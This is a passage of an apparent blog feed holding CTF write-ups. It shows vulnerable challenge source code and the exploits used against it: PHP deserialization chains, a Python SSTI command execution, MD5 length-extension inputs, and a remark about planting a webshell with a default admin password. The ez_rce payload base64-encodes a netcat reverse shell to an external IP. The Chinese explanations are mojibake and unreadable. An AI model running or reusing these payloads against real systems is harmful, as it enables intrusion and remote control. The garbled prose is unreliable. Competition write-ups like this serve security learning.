class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">miaomiao</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=<span class="variable language_">$this</span>-&gt;fei;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you should think harder!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&quot;wanna_fl.ag&quot;</span>]));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œååºåˆ—åŒ–å¤´å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œç„¶åç”¨å¼•ç”¨ç»•è¿‡miaomiao()æ–¹æ³•</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding = <span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;a = &amp;<span class="variable">$a</span>-&gt;ding-&gt;gao;</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;fei = <span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">?</span><span class="variable">wanna</span><span class="punctuation">[</span><span class="variable">fl</span><span class="operator">.</span><span class="variable">ag</span><span class="operator">=</span><span class="variable">a</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">i</span><span class="operator">:</span><span class="number">0</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;musca&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;ding&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;misca&quot;</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;gao&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;fei&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">8</span><span class="operator">:</span><span class="string">&quot;milaoshu&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;v&quot;</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">52</span><span class="operator">:</span><span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;a&quot;</span><span class="operator">;</span><span class="variable">R</span><span class="operator">:</span><span class="number">4</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-no-wake-up">[WEEK2]no_wake_up</h2><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;try&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>fast_destruct ç»•è¿‡wakeupï¼Œexpå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">try</span>=O:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-rce">[WEEK2]ez_rce</h2><p>æºç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gett</span>(<span class="params">obj, arg</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, i)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sett</span>(<span class="params">obj, arg, num</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arg) - <span class="number">1</span>):</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, arg[i])</span><br><span class="line">    <span class="built_in">setattr</span>(tmp, arg[i + <span class="number">1</span>], num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(<span class="params">giveme, num, bol</span>):</span><br><span class="line">    c = gett(subprocess, giveme)</span><br><span class="line">    tmp = <span class="built_in">list</span>(c)</span><br><span class="line">    tmp[num] = bol</span><br><span class="line">    tmp = <span class="built_in">tuple</span>(tmp)</span><br><span class="line">    sett(subprocess, giveme, tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">arg</span>):</span><br><span class="line">    subprocess.call(arg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.args.get(<span class="string">&#x27;exec&#x27;</span>) == <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            shell = request.args.get(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">            cmd(shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exp = <span class="built_in">list</span>(request.get_json()[<span class="string">&#x27;exp&#x27;</span>])</span><br><span class="line">            num = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;num&#x27;</span>))</span><br><span class="line">            bol = <span class="built_in">bool</span>(request.args.get(<span class="string">&#x27;bol&#x27;</span>))</span><br><span class="line">            hint(exp, num, bol)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ç‚¹ï¼š</p><p>1.è¿™é‡Œçš„subprocess.callçš„shellå±æ€§é»˜è®¤ä¸ºfalseï¼Œåªèƒ½æ‰§è¡Œå•ä¸ªå‘½ä»¤</p><p>2.callå’Œrunç­‰å‡½æ•°ä¸€æ ·ï¼Œä»–ä»¬éƒ½æ˜¯ä½¿ç”¨Popenè¿›è¡Œå°è£…çš„ï¼Œè¿è¡Œæ—¶éƒ½ä¼šè°ƒç”¨è¿™ä¸ªï¼Œå‚è€ƒhttps://blog.csdn.net/wzj_110/article/details/116612425</p><p>3.ä½¿ç”¨__defaults__æ–¹æ³•æ˜¯å¯ä»¥è·å¾—æŸå‡½æ•°æˆ–è€…ç±»å†…çš„æ‰€æœ‰å±æ€§</p><p>æ€»ä½“æ€è·¯å°±æ˜¯æ‰¾åˆ°Popené‡Œé¢çš„shellå±æ€§ï¼Œå°†å…¶ä¿®æ”¹ä¸ºtrueï¼Œè¿›è€Œè®©callæ‰§è¡Œå¤šæ®µå‘½ä»¤</p><p>ä¸€é˜¶æ®µpayloadå¦‚ä¸‹:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span></span><br><span class="line">?<span class="attr">num</span><span class="operator">=</span><span class="number">7</span><span class="variable">&amp;bol</span>=<span class="number">1</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">POST:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;exp&quot;</span>:<span class="punctuation">&#123;</span><span class="string">&quot;Popen&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__defaults__&quot;</span>:<span class="string">&quot;123&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>äºŒé˜¶æ®µpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">exec</span>=ok&amp;shell=`echo <span class="attribute">bmMgMTEwLjQxLjE3LjE4MyAyNTAgLWUgL2Jpbi9zaA</span>== | base64 -d`</span><br></pre></td></tr></table></figure><h2 id="WEEK2-MD5çš„äº‹å°±æ‹œæ‰˜äº†">[WEEK2]MD5çš„äº‹å°±æ‹œæ‰˜äº†</h2><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹ï¼šå“ˆå¸Œæ‹“å±•é•¿åº¦æ”»å‡»ï¼Œå·¥å…·hashpumpï¼Œä¸‹é¢ä¼šä¸¾ä¾‹è¯´æ˜</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Input</span> Signature:  <span class="keyword">key</span>å’Œæ˜æ–‡åŠ å¯†åå¾—åˆ°çš„å“ˆå¸Œå€¼</span><br><span class="line"><span class="keyword">Input</span> Data:  ç»™å‡ºçš„æ˜æ–‡</span><br><span class="line"><span class="keyword">Input</span> <span class="keyword">Key</span> <span class="keyword">Length</span>:  <span class="keyword">key</span>çš„é•¿åº¦</span><br><span class="line"><span class="keyword">Input</span> Data to <span class="keyword">Add</span>:  æƒ³è¦æ·»åŠ çš„æ•°å€¼ï¼Œè¿™éƒ¨åˆ†æ˜¯å¿…é¡»å¾—æœ‰çš„ï¼Œå°±ç®—æ²¡ç”¨</span><br><span class="line">æœ€åå¾—åˆ°çš„ç»“æœæ˜¯ç»“åˆæ›´æ–°åå†…å®¹å¾—åˆ°çš„å“ˆå¸Œå€¼</span><br><span class="line">åé¢æ˜¯ä¼ªé€ çš„password</span><br></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡ŒæŠŠflagçš„æœ€åä¸€ä¸ªå­—ç¬¦&#125;å½“æˆå·²çŸ¥çš„å­—ç¬¦è¿›è¡Œä¼ªé€ æ–°çš„<span class="built_in">md5</span>å€¼ï¼ŒæŠŠå‰©ä¸‹çš„flagå½“ä½œ<span class="built_in">key</span></span><br></pre></td></tr></table></figure><p>ä¸€é˜¶æ®µï¼šè·å¾—flagçš„md5å’Œé•¿åº¦ï¼Œå¼€å§‹å°±æ˜¯ä¸€ä¸ªurlæ‹†åˆ†å¥—å¨ƒ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170602470.png" alt="image-20231015170602470"></p><p>äºŒé˜¶æ®µï¼šè¿›è¡Œmd5ä¼ªé€ </p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170757186.png" alt="image-20231015170757186"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¼ å‚çš„æ—¶å€™å»æ‰æœ€å‰é¢çš„&#125;ï¼Œå› ä¸ºçœŸæ­£çš„<span class="built_in">key</span>ï¼ˆflagï¼‰ï¼Œåé¢æ˜¯è‡ªå¸¦ä¸€ä¸ª&#125;çš„</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?length<span class="operator">=</span><span class="variable">%80</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>P<span class="variable">%01</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>a</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">SHCTF<span class="operator">=</span>d<span class="number">285</span><span class="keyword">c</span><span class="number">0</span>becc<span class="number">667923569236</span>d<span class="number">9</span>eed<span class="number">60</span><span class="keyword">c</span><span class="number">79</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-ssti">[WEEK2]ez_ssti</h2><p>ssti</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">åœ¨hackerbaréšæ‰‹ç‚¹äº†ä¸ªexpå°±getshelläº†</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;<span class="name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-EasyCMS">[WEEK2]EasyCMS</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç½‘ä¸Šæœåå°ï¼Œ<span class="literal">admin</span>/<span class="literal">admin</span>.phpï¼Œå¯†ç æ˜¯taoï¼Œè¿›å…¥åå°å‘ç°å¯ä»¥ç¼–è¾‘æ–‡ä»¶ï¼Œç›´æ¥å†™ä¸ªé©¬ï¼Œèšå‰‘è¿æ¥ç»“æŸæˆ˜æ–—</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">å±±æ²³CTFï¼Œæ„Ÿè°¢ä¸»åŠæ–¹</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="æ¯”èµ›WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>NewStar CTF WEEK 2</title>
    <link href="https://bowuchuling.github.io/posts/1837dhw7.html"/>
    <id>https://bowuchuling.github.io/posts/1837dhw7.html</id>
    <published>2023-10-13T12:41:55.196Z</published>
    <updated>2023-10-13T12:48:36.801Z</updated>
    
    <content type="html"><![CDATA[<h1>NewStar CTF WEEK 2</h1><h2 id="æ¸¸æˆé«˜æ‰‹">æ¸¸æˆé«˜æ‰‹</h2><p>ç®€å•çš„JSå°æ¸¸æˆ</p><p><strong>å¦‚æœä½ åƒæˆ‘ä¸€æ ·æ— èŠï¼Œä½ å¯ä»¥å°è¯•å°†é£æœºæ‹‰è‡³æœ€ä¸‹æ–¹ï¼Œé™ç­‰flag</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013201850838.png" alt="image-20231013201850838"></p><p>æ‰¾åˆ°äº†ä¸‹é¢è¿™æ®µä»£ç ï¼Œå¤§æ¦‚å°±æ˜¯ç©å¤Ÿåˆ†æ•°ç»™ä½ ä¿¡æ¯çš„æ„æ€</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202021581.png" alt="image-20231013202021581"></p><p>è¿™é‡Œæ‰§è¡Œåœ¨æ§åˆ¶å°è¿›è¡Œå˜é‡å®šä¹‰ï¼Œç„¶åç›´æ¥å»é€ï¼Œå¾—åˆ°flag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202154600.png" alt="image-20231013202154600"></p><h2 id="include-0ã€‚0">include 0ã€‚0</h2><p>æºä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span 